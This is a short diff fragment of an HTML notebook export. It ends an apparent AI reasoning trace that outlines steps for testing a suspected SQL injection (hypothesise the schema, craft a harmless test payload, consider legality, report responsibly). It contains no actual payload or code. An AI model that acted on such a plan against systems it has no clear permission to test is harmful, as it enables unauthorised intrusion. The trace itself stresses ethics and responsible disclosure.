+Determine that a SQL injection attempt is likely based on the signal.
+Formulate a hypothesis about the database structure and potential vulnerability.
+Craft a payload to test for SQL injection without causing harm or data loss.
+Consider ethical implications and ensure compliance with laws and regulations.
+Plan to report findings responsibly if successful.
+Prepare to document steps taken and evidence collected.
+Reflect on need for further investigation if initial attempts fail. &lt;/think&gt;
+&lt;|im_end|&gt;
+</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer class="export-footer">
+        Exported with <a href="https://www.runcell.dev/tool/ipynb-to-html">runcell</a> — convert notebooks to HTML or PDF anytime at runcell.dev.
+    </footer>
+</body>
+</html>
